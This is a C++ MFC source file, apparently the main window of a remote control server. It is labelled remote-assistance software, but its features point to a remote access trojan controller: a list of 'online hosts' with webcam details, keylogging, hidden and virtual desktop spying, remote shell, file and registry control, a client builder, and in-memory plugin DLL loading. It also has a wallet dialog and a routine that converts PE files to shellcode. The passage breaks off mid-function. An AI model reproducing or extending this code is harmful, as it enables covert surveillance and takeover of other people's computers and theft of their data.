
// 2015RemoteDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "2015Remote.h"
#include "2015RemoteDlg.h"
#include "afxdialogex.h"
#include "SettingDlg.h"
#include "IOCPServer.h"
#include "ScreenSpyDlg.h"
#include "FileManagerDlg.h"
#include "TalkDlg.h"
#include "ShellDlg.h"
#include "SystemDlg.h"
#include "BuildDlg.h"
#include "AudioDlg.h"
#include "RegisterDlg.h"
#include "ServicesDlg.h"
#include "VideoDlg.h"
#include <vector>
#include "KeyBoardDlg.h"
#include "InputDlg.h"
#include "CPasswordDlg.h"
#include "pwd_gen.h"
#include "common/location.h"
#include <proxy/ProxyMapDlg.h>
#include "DateVerify.h"
#include <fstream>
#include "common/skCrypter.h"
#include "common/commands.h"
#include "common/md5.h"
#include <algorithm>
#include "HideScreenSpyDlg.h"
#include <sys/MachineDlg.h>
#include "Chat.h"
#include "DecryptDlg.h"
#include "adapter.h"
#include "client/MemoryModule.h"
#include <file/CFileManagerDlg.h>
#include "CDrawingBoard.h"
#include "CWalletDlg.h"
#include <wallet.h>

#ifdef _DEBUG
#define new DEBUG_NEW
#endif

#define UM_ICONNOTIFY WM_USER+100
#define TIMER_CHECK 1
#define TIMER_CLOSEWND 2

typedef struct
{
	const char*   szTitle;     //列表的名称
	int		nWidth;            //列表的宽度
}COLUMNSTRUCT;

const int  g_Column_Count_Online  = ONLINELIST_MAX; // 报表的列数

COLUMNSTRUCT g_Column_Data_Online[g_Column_Count_Online] = 
{
	{"IP",				130	},
	{"端口",			60	},
	{"地理位置",		130	},
	{"计算机名/备注",	150	},
	{"操作系统",		120	},
	{"CPU",				80	},
	{"摄像头",			70	},
	{"RTT",				70	},
	{"版本",			90	},
	{"安装时间",        120 },
	{"活动窗口",		140 },
	{"类型",			50 },
};

// 用于应用程序“关于”菜单项的 CAboutDlg 对话框

const int g_Column_Count_Message = 3;   // 列表的个数

COLUMNSTRUCT g_Column_Data_Message[g_Column_Count_Message] = 
{
	{"信息类型",		200	},
	{"时间",			200	},
	{"信息内容",	    490	}
};

int g_Column_Online_Width  = 0;
int g_Column_Message_Width = 0;

CMy2015RemoteDlg*  g_2015RemoteDlg = NULL;

static UINT Indicators[] =
{
	IDR_STATUSBAR_STRING  
};

std::string EventName() {
	char eventName[64];
	snprintf(eventName, sizeof(eventName), "EVENT_%d", GetCurrentProcessId());
	return eventName;
}

//////////////////////////////////////////////////////////////////////////

// 保存 unordered_map 到文件
void SaveToFile(const ComputerNoteMap& data, const std::string& filename)
{
	std::ofstream outFile(filename, std::ios::binary);  // 打开文件（以二进制模式）
	if (outFile.is_open()) {
		for (const auto& pair : data) {
			outFile.write(reinterpret_cast<const char*>(&pair.first), sizeof(ClientKey));  // 保存 key
			int valueSize = pair.second.GetLength();
			outFile.write(reinterpret_cast<const char*>(&valueSize), sizeof(int));  // 保存 value 的大小
			outFile.write((char*)&pair.second, valueSize);  // 保存 value 字符串
		}
		outFile.close();
	}
	else {
		Mprintf("Unable to open file '%s' for writing!\n", filename.c_str());
	}
}

// 从文件读取 unordered_map 数据
void LoadFromFile(ComputerNoteMap& data, const std::string& filename)
{
	std::ifstream inFile(filename, std::ios::binary);  // 打开文件（以二进制模式）
	if (inFile.is_open()) {
		while (inFile.peek() != EOF) {
			ClientKey key;
			inFile.read(reinterpret_cast<char*>(&key), sizeof(ClientKey));  // 读取 key

			int valueSize;
			inFile.read(reinterpret_cast<char*>(&valueSize), sizeof(int));  // 读取 value 的大小

			ClientValue value;
			inFile.read((char*)&value, valueSize);  // 读取 value 字符串

			data[key] = value;  // 插入到 map 中
		}
		inFile.close();
	}
	else {
		Mprintf("Unable to open file '%s' for reading!\n", filename.c_str());
	}
}

//////////////////////////////////////////////////////////////////////////

class CAboutDlg : public CDialogEx
{
public:
	CAboutDlg();

	// 对话框数据
	enum { IDD = IDD_ABOUTBOX };

protected:
	virtual void DoDataExchange(CDataExchange* pDX);    // DDX/DDV 支持

	// 实现
protected:
	DECLARE_MESSAGE_MAP()
};

CAboutDlg::CAboutDlg() : CDialogEx(CAboutDlg::IDD)
{
}

void CAboutDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
}

BEGIN_MESSAGE_MAP(CAboutDlg, CDialogEx)
END_MESSAGE_MAP()


// CMy2015RemoteDlg 对话框

std::string GetDbPath() {
	static char path[MAX_PATH], *name = "YAMA.db";
	static std::string ret = (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path)) ? "." : path)
		+ std::string("\\YAMA\\");
	static BOOL ok = CreateDirectoryA(ret.c_str(), NULL);
	static std::string dbPath = ret + name;
	return dbPath;
}

std::string GetFrpSettingsPath() {
#ifdef _DEBUG
	char path[MAX_PATH];
	GetModuleFileNameA(NULL, path, MAX_PATH);
	GET_FILEPATH(path, "frpc.ini");
	return path;
#else
	static char path[MAX_PATH], * name = "frpc.ini";
	static std::string ret = (FAILED(SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, path)) ? "." : path)
		+ std::string("\\YAMA\\");
	static BOOL ok = CreateDirectoryA(ret.c_str(), NULL);
	static std::string p = ret + name;
	return p;
#endif
}

std::string GetFileName(const char* filepath) {
	const char* slash1 = strrchr(filepath, '/');
	const char* slash2 = strrchr(filepath, '\\');
	const char* slash = slash1 > slash2 ? slash1 : slash2;
	return slash ? slash + 1 : filepath;
}

bool IsDll64Bit(BYTE* dllBase) {
	if (!dllBase) return false;

	auto dos = (IMAGE_DOS_HEADER*)dllBase;
	if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
		Mprintf("Invalid DOS header\n");
		return false;
	}

	auto nt = (IMAGE_NT_HEADERS*)(dllBase + dos->e_lfanew);
	if (nt->Signature != IMAGE_NT_SIGNATURE) {
		Mprintf("Invalid NT header\n");
		return false;
	}

	WORD magic = nt->OptionalHeader.Magic;
	return magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC;
}

// 返回：读取的字节数组指针（需要手动释放）
DllInfo* ReadPluginDll(const std::string& filename) {
	// 打开文件（以二进制模式）
	std::ifstream file(filename, std::ios::binary | std::ios::ate);
	std::string name = GetFileName(filename.c_str());
	if (!file.is_open() || name.length() >= 32) {
		Mprintf("无法打开文件: %s\n", filename.c_str());
		return nullptr;
	}

	// 获取文件大小
	std::streamsize fileSize = file.tellg();
	file.seekg(0, std::ios::beg);

	// 分配缓冲区: CMD + DllExecuteInfo + size
	BYTE* buffer = new BYTE[1 + sizeof(DllExecuteInfo) + fileSize];
	BYTE* dllData = buffer + 1 + sizeof(DllExecuteInfo);
	if (!file.read(reinterpret_cast<char*>(dllData), fileSize)) {
		Mprintf("读取文件失败: %s\n", filename.c_str());
		delete[] buffer;
		return nullptr;
	}
	if (!IsDll64Bit(dllData)) {
		Mprintf("不支持32位DLL: %s\n", filename.c_str());
		delete[] buffer;
		return nullptr;
	}
	std::string masterHash(GetMasterHash());
	int offset = MemoryFind((char*)dllData, masterHash.c_str(), fileSize, masterHash.length());
	if (offset != -1) {
		std::string masterId = GetPwdHash(), hmac = GetHMAC();
		if(hmac.empty())
			hmac = THIS_CFG.GetStr("settings", "HMAC");
		memcpy((char*)dllData + offset, masterId.c_str(), masterId.length());
		memcpy((char*)dllData + offset + masterId.length(), hmac.c_str(), hmac.length());
	}

	// 设置输出参数
	auto md5 = CalcMD5FromBytes(dllData, fileSize);
	DllExecuteInfo info = { MEMORYDLL, fileSize, CALLTYPE_IOCPTHREAD, };
	memcpy(info.Name, name.c_str(), name.length());
	memcpy(info.Md5, md5.c_str(), md5.length());
	buffer[0] = CMD_EXECUTE_DLL;
	memcpy(buffer + 1, &info, sizeof(DllExecuteInfo));
	Buffer* buf = new Buffer(buffer, 1 + sizeof(DllExecuteInfo) + fileSize, 0, md5);
	SAFE_DELETE_ARRAY(buffer);
	return new DllInfo{ name, buf };
}

std::vector<DllInfo*> ReadAllDllFilesWindows(const std::string& dirPath) {
	std::vector<DllInfo*> result;

	std::string searchPath = dirPath + "\\*.dll";
	WIN32_FIND_DATAA findData;
	HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);

	if (hFind == INVALID_HANDLE_VALUE) {
		Mprintf("无法打开目录: %s\n", dirPath.c_str());
		return result;
	}

	do {
		if (!(findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			std::string fullPath = dirPath + "\\" + findData.cFileName;
			DllInfo* dll = ReadPluginDll(fullPath.c_str());
			if (dll) {
				result.push_back(dll);
			}
		}
	} while (FindNextFileA(hFind, &findData));

	FindClose(hFind);
	return result;
}

std::string GetParentDir()
{
	char exePath[MAX_PATH];
	GetModuleFileNameA(NULL, exePath, MAX_PATH);

	std::string path(exePath);

	// 找到最后一个反斜杠，得到程序目录
	size_t pos = path.find_last_of("\\/");
	if (pos != std::string::npos) {
		path = path.substr(0, pos); // 程序目录
	}

	// 再往上一级
	pos = path.find_last_of("\\/");
	if (pos != std::string::npos) {
		path = path.substr(0, pos);
	}

	return path;
}

CMy2015RemoteDlg::CMy2015RemoteDlg(CWnd* pParent): CDialogEx(CMy2015RemoteDlg::IDD, pParent)
{
	auto s = GetMasterHash();
	char buf[17] = { 0 };
	std::strncpy(buf, s.c_str(), 16);
	m_superID = std::strtoull(buf, NULL, 16);

	m_nMaxConnection = 2;
	m_hExit = CreateEvent(NULL, TRUE, FALSE, NULL);
	m_hIcon = THIS_APP->LoadIcon(IDR_MAINFRAME);

	m_bmOnline[0].LoadBitmap(IDB_BITMAP_ONLINE);
	m_bmOnline[1].LoadBitmap(IDB_BITMAP_UPDATE);
	m_bmOnline[2].LoadBitmap(IDB_BITMAP_DELETE);
	m_bmOnline[3].LoadBitmap(IDB_BITMAP_SHARE);
	m_bmOnline[4].LoadBitmap(IDB_BITMAP_PROXY);
	m_bmOnline[5].LoadBitmap(IDB_BITMAP_HOSTNOTE);
	m_bmOnline[6].LoadBitmap(IDB_BITMAP_VDESKTOP);
	m_bmOnline[7].LoadBitmap(IDB_BITMAP_GDESKTOP);
	m_bmOnline[8].LoadBitmap(IDB_BITMAP_DDESKTOP);
	m_bmOnline[9].LoadBitmap(IDB_BITMAP_SDESKTOP);
	m_bmOnline[10].LoadBitmap(IDB_BITMAP_AUTHORIZE);
	m_bmOnline[11].LoadBitmap(IDB_BITMAP_UNAUTH);
	m_bmOnline[12].LoadBitmap(IDB_BITMAP_ASSIGNTO);
	m_bmOnline[13].LoadBitmap(IDB_BITMAP_ADDWATCH);
	m_bmOnline[14].LoadBitmap(IDB_BITMAP_ADMINRUN);

	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
		m_ServerDLL[i] = nullptr;
		m_ServerBin[i] = nullptr;
	}

	InitializeCriticalSection(&m_cs);

	// Init DLL list
	char path[_MAX_PATH];
	GetModuleFileNameA(NULL, path, _MAX_PATH);
	GET_FILEPATH(path, "Plugins");
	m_DllList = ReadAllDllFilesWindows(path);
	m_tinyDLL = NULL;
	auto dlls = ReadAllDllFilesWindows(GetParentDir() + "\\Plugins");
	m_DllList.insert(m_DllList.end(), dlls.begin(), dlls.end());
}


CMy2015RemoteDlg::~CMy2015RemoteDlg()
{
	DeleteCriticalSection(&m_cs);
	for (int i = 0; i < PAYLOAD_MAXTYPE; i++) {
		SAFE_DELETE(m_ServerDLL[i]);
		SAFE_DELETE(m_ServerBin[i]);
	}
	for (int i = 0; i < m_DllList.size(); i++)
	{
		SAFE_DELETE(m_DllList[i]);
	}
	if (m_tinyDLL) {
		MemoryFreeLibrary(m_tinyDLL);
		m_tinyDLL = NULL;
	}
}

void CMy2015RemoteDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_ONLINE, m_CList_Online);
	DDX_Control(pDX, IDC_MESSAGE, m_CList_Message);
}

BEGIN_MESSAGE_MAP(CMy2015RemoteDlg, CDialogEx)
	ON_WM_SYSCOMMAND()
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	ON_WM_SIZE()
	ON_WM_TIMER()
	ON_WM_CLOSE()
	ON_NOTIFY(NM_RCLICK, IDC_ONLINE, &CMy2015RemoteDlg::OnNMRClickOnline)
	ON_NOTIFY(HDN_ITEMCLICK, 0, &CMy2015RemoteDlg::OnHdnItemclickList)
	ON_COMMAND(ID_ONLINE_MESSAGE, &CMy2015RemoteDlg::OnOnlineMessage)
	ON_COMMAND(ID_ONLINE_DELETE, &CMy2015RemoteDlg::OnOnlineDelete)
	ON_COMMAND(ID_ONLINE_UPDATE, &CMy2015RemoteDlg::OnOnlineUpdate)
	ON_COMMAND(IDM_ONLINE_ABOUT, &CMy2015RemoteDlg::OnAbout)
	ON_COMMAND(ID_HELP, &CMy2015RemoteDlg::OnAbout)

	ON_COMMAND(IDM_ONLINE_CMD, &CMy2015RemoteDlg::OnOnlineCmdManager)
	ON_COMMAND(IDM_ONLINE_PROCESS, &CMy2015RemoteDlg::OnOnlineProcessManager)
	ON_COMMAND(IDM_ONLINE_WINDOW, &CMy2015RemoteDlg::OnOnlineWindowManager)
	ON_COMMAND(IDM_ONLINE_DESKTOP, &CMy2015RemoteDlg::OnOnlineDesktopManager)
	ON_COMMAND(IDM_ONLINE_FILE, &CMy2015RemoteDlg::OnOnlineFileManager)
	ON_COMMAND(IDM_ONLINE_AUDIO, &CMy2015RemoteDlg::OnOnlineAudioManager)
	ON_COMMAND(IDM_ONLINE_VIDEO, &CMy2015RemoteDlg::OnOnlineVideoManager)
	ON_COMMAND(IDM_ONLINE_SERVER, &CMy2015RemoteDlg::OnOnlineServerManager)
	ON_COMMAND(IDM_ONLINE_REGISTER, &CMy2015RemoteDlg::OnOnlineRegisterManager)
	ON_COMMAND(IDM_KEYBOARD, &CMy2015RemoteDlg::OnOnlineKeyboardManager)
	ON_COMMAND(IDM_ONLINE_BUILD, &CMy2015RemoteDlg::OnOnlineBuildClient)    //生成Client
	ON_MESSAGE(UM_ICONNOTIFY, (LRESULT(__thiscall CWnd::*)(WPARAM, LPARAM))OnIconNotify)
	ON_COMMAND(IDM_NOTIFY_SHOW, &CMy2015RemoteDlg::OnNotifyShow)
	ON_COMMAND(ID_NOTIFY_EXIT, &CMy2015RemoteDlg::OnNotifyExit)
	ON_COMMAND(ID_MAIN_SET, &CMy2015RemoteDlg::OnMainSet)
	ON_COMMAND(ID_MAIN_EXIT, &CMy2015RemoteDlg::OnMainExit)
	ON_MESSAGE(WM_USERTOONLINELIST, OnUserToOnlineList)
	ON_MESSAGE(WM_USEROFFLINEMSG, OnUserOfflineMsg)
	ON_MESSAGE(WM_OPENSCREENSPYDIALOG, OnOpenScreenSpyDialog)
	ON_MESSAGE(WM_OPENFILEMANAGERDIALOG, OnOpenFileManagerDialog)
	ON_MESSAGE(WM_OPENTALKDIALOG, OnOpenTalkDialog)
	ON_MESSAGE(WM_OPENSHELLDIALOG, OnOpenShellDialog)
	ON_MESSAGE(WM_OPENSYSTEMDIALOG, OnOpenSystemDialog)
	ON_MESSAGE(WM_OPENAUDIODIALOG, OnOpenAudioDialog)
	ON_MESSAGE(WM_OPENSERVICESDIALOG, OnOpenServicesDialog)
	ON_MESSAGE(WM_OPENREGISTERDIALOG, OnOpenRegisterDialog)
	ON_MESSAGE(WM_OPENWEBCAMDIALOG, OnOpenVideoDialog)
	ON_MESSAGE(WM_HANDLEMESSAGE, OnHandleMessage)
	ON_MESSAGE(WM_OPENKEYBOARDDIALOG, OnOpenKeyboardDialog)
	ON_MESSAGE(WM_OPENPROXYDIALOG, OnOpenProxyDialog)
	ON_MESSAGE(WM_OPENHIDESCREENDLG, OnOpenHideScreenDialog)
	ON_MESSAGE(WM_OPENMACHINEMGRDLG, OnOpenMachineManagerDialog)
	ON_MESSAGE(WM_OPENCHATDIALOG, OnOpenChatDialog)
	ON_MESSAGE(WM_OPENDECRYPTDIALOG, OnOpenDecryptDialog)
	ON_MESSAGE(WM_OPENFILEMGRDIALOG, OnOpenFileMgrDialog)
	ON_MESSAGE(WM_OPENDRAWINGBOARD, OnOpenDrawingBoard)
	ON_MESSAGE(WM_UPXTASKRESULT, UPXProcResult)
	ON_MESSAGE(WM_PASSWORDCHECK, OnPasswordCheck)
	ON_MESSAGE(WM_SHOWMESSAGE, OnShowMessage)
	ON_MESSAGE(WM_SHOWERRORMSG, OnShowErrMessage)
	ON_WM_HELPINFO()
	ON_COMMAND(ID_ONLINE_SHARE, &CMy2015RemoteDlg::OnOnlineShare)
	ON_COMMAND(ID_TOOL_AUTH, &CMy2015RemoteDlg::OnToolAuth)
	ON_COMMAND(ID_TOOL_GEN_MASTER, &CMy2015RemoteDlg::OnToolGenMaster)
	ON_COMMAND(ID_MAIN_PROXY, &CMy2015RemoteDlg::OnMainProxy)
	ON_COMMAND(ID_ONLINE_HOSTNOTE, &CMy2015RemoteDlg::OnOnlineHostnote)
	ON_COMMAND(ID_HELP_IMPORTANT, &CMy2015RemoteDlg::OnHelpImportant)
	ON_COMMAND(ID_HELP_FEEDBACK, &CMy2015RemoteDlg::OnHelpFeedback)
	// 将所有动态子菜单项的命令 ID 映射到同一个响应函数
	ON_COMMAND_RANGE(ID_DYNAMIC_MENU_BASE, ID_DYNAMIC_MENU_BASE + 20, &CMy2015RemoteDlg::OnDynamicSubMenu)
	ON_COMMAND(ID_ONLINE_VIRTUAL_DESKTOP, &CMy2015RemoteDlg::OnOnlineVirtualDesktop)
	ON_COMMAND(ID_ONLINE_GRAY_DESKTOP, &CMy2015RemoteDlg::OnOnlineGrayDesktop)
	ON_COMMAND(ID_ONLINE_REMOTE_DESKTOP, &CMy2015RemoteDlg::OnOnlineRemoteDesktop)
	ON_COMMAND(ID_ONLINE_H264_DESKTOP, &CMy2015RemoteDlg::OnOnlineH264Desktop)
	ON_COMMAND(ID_WHAT_IS_THIS, &CMy2015RemoteDlg::OnWhatIsThis)
	ON_COMMAND(ID_ONLINE_AUTHORIZE, &CMy2015RemoteDlg::OnOnlineAuthorize)
	ON_NOTIFY(NM_DBLCLK, IDC_ONLINE, &CMy2015RemoteDlg::OnListClick)
	ON_COMMAND(ID_ONLINE_UNAUTHORIZE, &CMy2015RemoteDlg::OnOnlineUnauthorize)
	ON_COMMAND(ID_TOOL_REQUEST_AUTH, &CMy2015RemoteDlg::OnToolRequestAuth)
	ON_COMMAND(ID_TOOL_INPUT_PASSWORD, &CMy2015RemoteDlg::OnToolInputPassword)
	ON_COMMAND(ID_TOOL_GEN_SHELLCODE, &CMy2015RemoteDlg::OnToolGenShellcode)
	ON_COMMAND(ID_ONLINE_ASSIGN_TO, &CMy2015RemoteDlg::OnOnlineAssignTo)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_MESSAGE, &CMy2015RemoteDlg::OnNMCustomdrawMessage)
	ON_COMMAND(ID_ONLINE_ADD_WATCH, &CMy2015RemoteDlg::OnOnlineAddWatch)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_ONLINE, &CMy2015RemoteDlg::OnNMCustomdrawOnline)
	ON_COMMAND(ID_ONLINE_RUN_AS_ADMIN, &CMy2015RemoteDlg::OnOnlineRunAsAdmin)
	ON_COMMAND(ID_MAIN_WALLET, &CMy2015RemoteDlg::OnMainWallet)
END_MESSAGE_MAP()


// CMy2015RemoteDlg 消息处理程序
void CMy2015RemoteDlg::OnIconNotify(WPARAM wParam, LPARAM lParam)   
{
	switch ((UINT)lParam)
	{
	case WM_LBUTTONDOWN:
		{
			if (IsIconic())
			{
				ShowWindow(SW_SHOW);
				break;
			}
			ShowWindow(IsWindowVisible() ? SW_HIDE : SW_SHOW);
			SetForegroundWindow();
			break;
		}
	case WM_RBUTTONDOWN:
		{
			CMenu Menu;
			Menu.LoadMenu(IDR_MENU_NOTIFY);
			CPoint Point;
			GetCursorPos(&Point);
			SetForegroundWindow();   //设置当前窗口
			Menu.GetSubMenu(0)->TrackPopupMenu(
				TPM_LEFTBUTTON|TPM_RIGHTBUTTON, 
				Point.x, Point.y, this, NULL); 

			break;
		}
	}
}

VOID CMy2015RemoteDlg::CreateSolidMenu()
{
	m_MainMenu.LoadMenu(IDR_MENU_MAIN);
	CMenu* SubMenu = m_MainMenu.GetSubMenu(1);
	std::string masterHash(GetMasterHash());
	if (GetPwdHash() != masterHash || m_superPass.empty()) {
		SubMenu->DeleteMenu(ID_TOOL_GEN_MASTER, MF_BYCOMMAND);
	}
	SubMenu = m_MainMenu.GetSubMenu(2);
	if (!THIS_CFG.GetStr("settings", "Password").empty()) {
		SubMenu->DeleteMenu(ID_TOOL_REQUEST_AUTH, MF_BYCOMMAND);
	}

	::SetMenu(this->GetSafeHwnd(), m_MainMenu.GetSafeHmenu()); //为窗口设置菜单
	::DrawMenuBar(this->GetSafeHwnd());                        //显示菜单
}

VOID CMy2015RemoteDlg::CreatStatusBar()
{
	if (!m_StatusBar.Create(this) ||
		!m_StatusBar.SetIndicators(Indicators,
		sizeof(Indicators)/sizeof(UINT)))                    //创建状态条并设置字符资源的ID
	{
		return ;      
	}

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);
}

VOID CMy2015RemoteDlg::CreateNotifyBar()
{
	m_Nid.cbSize = sizeof(NOTIFYICONDATA);     //大小赋值
	m_Nid.hWnd = m_hWnd;           //父窗口    是被定义在父类CWnd类中
	m_Nid.uID = IDR_MAINFRAME;     //icon  ID
	m_Nid.uFlags = NIF_MESSAGE | NIF_ICON | NIF_TIP;     //托盘所拥有的状态
	m_Nid.uCallbackMessage = UM_ICONNOTIFY;              //回调消息
	m_Nid.hIcon = m_hIcon;                               //icon 变量
	CString strTips ="禁界: 远程协助软件";       //气泡提示
	lstrcpyn(m_Nid.szTip, (LPCSTR)strTips, sizeof(m_Nid.szTip) / sizeof(m_Nid.szTip[0]));
	Shell_NotifyIcon(NIM_ADD, &m_Nid);   //显示托盘
}

VOID CMy2015RemoteDlg::CreateToolBar()
{
	if (!m_ToolBar.CreateEx(this, TBSTYLE_FLAT, WS_CHILD | WS_VISIBLE | CBRS_TOP
		| CBRS_GRIPPER | CBRS_TOOLTIPS | CBRS_FLYBY | CBRS_SIZE_DYNAMIC) ||
		!m_ToolBar.LoadToolBar(IDR_TOOLBAR_MAIN))  //创建一个工具条  加载资源
	{
		return;     
	}
	m_ToolBar.LoadTrueColorToolBar
		(
		48,    //加载真彩工具条
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN,
		IDB_BITMAP_MAIN
		);  //和我们的位图资源相关联
	RECT Rect,RectMain;
	GetWindowRect(&RectMain);   //得到整个窗口的大小
	Rect.left=0;
	Rect.top=0;
	Rect.bottom=80;
	Rect.right=RectMain.right-RectMain.left+10;
	m_ToolBar.MoveWindow(&Rect,TRUE);

	m_ToolBar.SetButtonText(0,"终端管理");     //在位图的下面添加文件
	m_ToolBar.SetButtonText(1,"进程管理"); 
	m_ToolBar.SetButtonText(2,"窗口管理"); 
	m_ToolBar.SetButtonText(3,"桌面管理"); 
	m_ToolBar.SetButtonText(4,"文件管理"); 
	m_ToolBar.SetButtonText(5,"语音管理"); 
	m_ToolBar.SetButtonText(6,"视频管理"); 
	m_ToolBar.SetButtonText(7,"服务管理"); 
	m_ToolBar.SetButtonText(8,"注册表管理"); 
	m_ToolBar.SetButtonText(9, "键盘记录");
	m_ToolBar.SetButtonText(10,"参数设置"); 
	m_ToolBar.SetButtonText(11,"生成服务端"); 
	m_ToolBar.SetButtonText(12,"帮助"); 
	RepositionBars(AFX_IDW_CONTROLBAR_FIRST,AFX_IDW_CONTROLBAR_LAST,0);  //显示
}


VOID CMy2015RemoteDlg::InitControl()
{
	//专属函数

	CRect rect;
	GetWindowRect(&rect);
	rect.bottom+=20;
	MoveWindow(rect);
	auto style = LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES | LVS_EX_DOUBLEBUFFER | LVS_EX_HEADERDRAGDROP | LVS_EX_LABELTIP;
	for (int i = 0;i<g_Column_Count_Online;++i)
	{
		m_CList_Online.InsertColumn(i, g_Column_Data_Online[i].szTitle,LVCFMT_CENTER,g_Column_Data_Online[i].nWidth);

		g_Column_Online_Width+=g_Column_Data_Online[i].nWidth; 
	}
	m_CList_Online.ModifyStyle(0, LVS_SHOWSELALWAYS);
	m_CList_Online.SetExtendedStyle(style);

	for (int i = 0; i < g_Column_Count_Message; ++i)
	{
		m_CList_Message.InsertColumn(i, g_Column_Data_Message[i].szTitle, LVCFMT_LEFT,g_Column_Data_Message[i].nWidth);
		g_Column_Message_Width+=g_Column_Data_Message[i].nWidth;  
	}

	m_CList_Message.SetExtendedStyle(style);
}


VOID CMy2015RemoteDlg::TestOnline()
{
	ShowMessage("操作成功", "软件初始化成功...");
}


std::vector<CString> SplitCString(CString strData) {
	std::vector<CString> vecItems;
	CString strItem;
	int i = 0;

	while (AfxExtractSubString(strItem, strData, i, _T('|')))
	{
		vecItems.push_back(strItem);  // Add to vector
		i++;
	}
	return vecItems;
}


VOID CMy2015RemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, 
							   CString strCPU, CString strVideo, CString strPing, CString ver, 
	CString startTime, const std::vector<std::string>& v, CONTEXT_OBJECT * ContextObject)
{
	CString install = v[RES_INSTALL_TIME].empty() ? "?" : v[RES_INSTALL_TIME].c_str();
	CString path = v[RES_FILE_PATH].empty() ? "?" : v[RES_FILE_PATH].c_str();
	CString data[ONLINELIST_MAX] = { strIP, strAddr, "", strPCName, strOS, strCPU, strVideo, strPing, 
		ver, install, startTime, v[RES_CLIENT_TYPE].empty() ? "?" : v[RES_CLIENT_TYPE].c_str(), path };
	auto id = CONTEXT_OBJECT::CalculateID(data);
	bool modify = false;
	CString loc = GetClientMapData(id, MAP_LOCATION);
	if (loc.IsEmpty()) {
		loc = v[RES_CLIENT_LOC].c_str();
		if (loc.IsEmpty()) {
			IPConverter cvt;
			loc = cvt.GetGeoLocation(data[ONLINELIST_IP].GetString()).c_str();
		}
		if (!loc.IsEmpty()) {
			modify = true;
			SetClientMapData(id, MAP_LOCATION, loc);
		}
	}
	data[ONLINELIST_LOCATION] = loc;
	ContextObject->SetClientInfo(data, v);
	ContextObject->SetID(id);

	EnterCriticalSection(&m_cs);

	for (int i = 0, n = m_CList_Online.GetItemCount(); i < n; i++){
		CONTEXT_OBJECT* ctx = (CONTEXT_OBJECT*)m_CList_Online.GetItemData(i);
		if (ctx == ContextObject || ctx->GetID() == id) {
			LeaveCriticalSection(&m_cs);
			Mprintf("TODO: '%s' already exist!!\n", strIP);
			return;
		}
	}

	if (modify)
		SaveToFile(m_ClientMap, GetDbPath());
	auto& m = m_ClientMap[ContextObject->ID];
	bool flag = strIP == "127.0.0.1" && !v[RES_CLIENT_PUBIP].empty();
	int i = m_CList_Online.InsertItem(m_CList_Online.GetItemCount(), flag ? v[RES_CLIENT_PUBIP].c_str() : strIP);
	for (int n = ONLINELIST_ADDR; n <= ONLINELIST_CLIENTTYPE; n++) {
		n == ONLINELIST_COMPUTER_NAME ? 
			m_CList_Online.SetItemText(i, n, m.GetNote()[0] ? m.GetNote() : data[n]) :
			m_CList_Online.SetItemText(i, n, data[n].IsEmpty() ? "?" : data[n]);
	}
	m_CList_Online.SetItemData(i,(DWORD_PTR)ContextObject);
	std::string tip = flag ? " (" + v[RES_CLIENT_PUBIP] + ") " : "";
	ShowMessage("操作成功",strIP + tip.c_str() + "主机上线");
	LeaveCriticalSection(&m_cs);

	SendMasterSettings(ContextObject);
}

LRESULT CMy2015RemoteDlg::OnShowMessage(WPARAM wParam, LPARAM lParam) {
	if (wParam && !lParam) {
		CString* text = (CString*)wParam;
		ShowMessage("提示信息", *text);
		delete text;
		return S_OK;
	}
	std::string pwd = THIS_CFG.GetStr("settings", "Password");
	if (pwd.empty())
		ShowMessage("授权提醒", "程序可能有使用限制，请联系管理员请求授权");

	if (wParam && lParam)
	{
		uint32_t recvLow = (uint32_t)wParam;
		uint32_t recvHigh = (uint32_t)lParam;
		uint64_t restored = ((uint64_t)recvHigh << 32) | recvLow;
		if (restored != m_superID)
			THIS_APP->UpdateMaxConnection(3+time(0)%5);
	}
	return S_OK;
}

VOID CMy2015RemoteDlg::ShowMessage(CString strType, CString strMsg)
{
	AUTO_TICK(200);
	CTime Timer = CTime::GetCurrentTime();
	CString strTime= Timer.Format("%H:%M:%S");

	m_CList_Message.InsertItem(0, strType);    //向控件中设置数据
	m_CList_Message.SetItemText(0,1,strTime);
	m_CList_Message.SetItemText(0,2,strMsg);

	CString strStatusMsg;

	EnterCriticalSection(&m_cs);
	int m_iCount = m_CList_Online.GetItemCount();
	LeaveCriticalSection(&m_cs);

	strStatusMsg.Format("有%d个主机在线",m_iCount);
	m_StatusBar.SetPaneText(0,strStatusMsg);   //在状态条上显示文字
}

LRESULT CMy2015RemoteDlg::OnShowErrMessage(WPARAM wParam, LPARAM lParam) {
	CString* text = (CString*)wParam;
	CString* title = (CString*)lParam;

	CTime Timer = CTime::GetCurrentTime();
	CString strTime = Timer.Format("%H:%M:%S");

	m_CList_Message.InsertItem(0, title ? *title : "操作错误");
	m_CList_Message.SetItemText(0, 1, strTime);
	m_CList_Message.SetItemText(0, 2, text ? *text : "内部错误");
	delete title;
	delete text;

	return S_OK;
}

extern "C" BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, 
	LPVOID userData, DWORD userLength, DWORD flags, LPSTR * outBytes, DWORD * outLength);

bool MakeShellcode(LPBYTE& compressedBuffer, int& ulTotalSize, LPBYTE originBuffer, int ulOriginalLength, bool align=false) {
	if (originBuffer[0] == 'M' && originBuffer[1] == 'Z') {
		LPSTR finalShellcode = NULL;
		DWORD finalSize;
		if (!ConvertToShellcode(originBuffer, ulOriginalLength, NULL, NULL, 0, 0x1, &finalShellcode, &finalSize)) {
			return false;
		}
